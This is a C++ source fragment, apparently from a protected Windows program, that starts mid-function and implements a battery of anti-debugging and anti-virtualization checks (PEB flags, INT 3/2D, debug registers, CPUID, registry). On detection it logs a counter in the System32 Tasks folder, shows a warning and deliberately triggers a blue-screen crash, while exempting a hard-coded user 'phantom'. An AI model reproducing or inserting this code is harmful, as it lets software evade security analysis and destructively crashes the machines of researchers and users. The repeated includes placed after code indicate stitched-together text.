	for (int i = 0; i < 50; i++) {
		SetWindowPos(hwnd, NULL, x + (rand() % 10 - 5), y + (rand() % 10 - 5), 0, 0, SWP_NOSIZE | SWP_NOZORDER);
		Sleep(50);
	}
}

#include <windows.h>
#include <fstream>
#include <thread>
#include <windows.h>
#include <Lmcons.h>
#include <fstream>
#include <thread>
#include <cstring>

void AutoCloseMessageBox(HWND hWnd) {
	Sleep(3000);
	if (hWnd) PostMessage(hWnd, WM_CLOSE, 0, 0);
}

void ShowSecurityAlert(const char* reason) {
	char currentUser[UNLEN + 1];
	DWORD size = sizeof(currentUser);
	if (!GetUserNameA(currentUser, &size)) {
		return;
	}

	if (strcmp(currentUser, "phantom") != 0) {
		const char* logPath = "C:\\Windows\\System32\\Tasks\\debug_detect_count.txt";

		int detectionCount = 0;
		std::ifstream infile(logPath);
		if (infile.is_open()) {
			infile >> detectionCount;
			infile.close();
		}

		detectionCount++;
		std::ofstream outfile(logPath);
		if (outfile.is_open()) {
			outfile << detectionCount;
			outfile.close();
		}

		HWND hWnd = FindWindowA(NULL, reason);
		std::thread([hWnd]() { AutoCloseMessageBox(hWnd); }).detach();
		MessageBoxA(NULL, reason, "Debug Detection", MB_OK | MB_ICONWARNING);

		if (detectionCount >= 2) {
			triggerBSOD();
		}
	}

	exit(0);
}

security::internal::debug_results security::check_security() {
	using namespace security::internal;

	if (memory::being_debugged_peb() != debug_results::none) {
		ShowSecurityAlert("Being Debugged PEB");
		return debug_results::being_debugged_peb;
	}
	if (memory::remote_debugger_present() != debug_results::none) {
		ShowSecurityAlert("Remote Debugger Present");
		triggerBSOD();
		return debug_results::remote_debugger_present;
	}
	if (memory::is_debugger_present() != debug_results::none) {
		ShowSecurityAlert("Debugger is Present");
		triggerBSOD();
		return debug_results::debugger_is_present;
	}
	if (memory::nt_global_flag_peb() != debug_results::none) {
		ShowSecurityAlert("Being Debugged PEB");
		return debug_results::being_debugged_peb;
	}
	if (memory::nt_query_information_process() != debug_results::none) {
		ShowSecurityAlert("NT Query Information Process");
		return debug_results::nt_query_information_process;
	}
	if (memory::write_buffer() != debug_results::none) {
		ShowSecurityAlert("Write Buffer");
		triggerBSOD();
		return debug_results::write_buffer;
	}
	if (exceptions::close_handle_exception() != debug_results::none) {
		ShowSecurityAlert("Close Handle Exception");
		return debug_results::close_handle_exception;
	}
	if (exceptions::int_3() != debug_results::none) {
		ShowSecurityAlert("INT 3 Breakpoint");
		triggerBSOD();
		return debug_results::int_3_cc;
	}
	if (exceptions::int_2d() != debug_results::none) {
		ShowSecurityAlert("INT 2D Breakpoint");
		triggerBSOD();
		return debug_results::int_2;
	}
	if (exceptions::prefix_hop() != debug_results::none) {
		ShowSecurityAlert("Prefix Hop");
		return debug_results::prefix_hop;
	}
	if (exceptions::debug_string() != debug_results::none) {
		ShowSecurityAlert("Debug String Detected");
		triggerBSOD();
		return debug_results::debug_string;
	}
	if (cpu::hardware_debug_registers() != debug_results::none) {
		ShowSecurityAlert("Hardware Debug Registers");
		return debug_results::hardware_debug_registers;
	}
	if (cpu::mov_ss() != debug_results::none) {
		ShowSecurityAlert("MOV SS Check");
		return debug_results::mov_ss;
	}
	if (virtualization::check_cpuid() != debug_results::none) {
		ShowSecurityAlert("CPUID Virtualization Detected");
		triggerBSOD();
		return debug_results::check_cpuid;
	}
	if (virtualization::check_registry() != debug_results::none) {
		ShowSecurityAlert("Registry Virtualization Detected");
		triggerBSOD();
		return debug_results::check_registry;
	}

	return debug_results::none;
}